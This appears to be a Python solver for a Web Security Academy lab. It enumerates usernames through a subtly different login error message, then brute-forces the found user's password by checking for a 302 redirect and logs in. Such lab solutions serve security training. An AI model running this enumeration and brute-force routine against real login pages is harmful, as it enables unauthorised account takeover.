from web_security_academy.core.logger import logger
from web_security_academy.core.utils import auth_lab_usernames, auth_lab_passwords
from bs4 import BeautifulSoup


def solve_lab(session):
    usernames = auth_lab_usernames()
    passwords = auth_lab_passwords()

    # User enumeration
    logger.info("Enumerating users by examining login form response...")
    logger.toggle_newline()
    for user in usernames:
        data = {"username": user, "password": "IncorrectPassword"}
        resp = session.post_path("/login", data=data)
        soup = BeautifulSoup(resp.text, "lxml")
        query = soup.select_one("p.is-warning")

        if query is None:
            logger.failure("Unable to extract login form response.")
        else:
            warning = query.text

        # The period is important!
        if warning == "Invalid username or password.":
            logger.info(f"{user} => {warning}")
        else:
            logger.success(f"{user} => {warning}")
            logger.toggle_newline()
            break
    else:
        logger.failure("Unable to enumerate a valid username.")
        logger.toggle_newline()
        return

    # Password enumeration
    logger.info(f"Brute-forcing {user}'s password...")
    logger.toggle_newline()
    for password in passwords:
        data = {"username": user, "password": password}
        resp = session.post_path("/login", data=data, allow_redirects=False)

        if resp.status_code != 302:
            logger.info(f"{password} => {warning}")
        else:
            logger.success(f"{password} => Correct!")
            logger.toggle_newline()
            break
    else:
        logger.failure(f"Unable to brute-force {user}'s password.")
        logger.toggle_newline()
        return

    session.login(user, password, with_csrf=False)
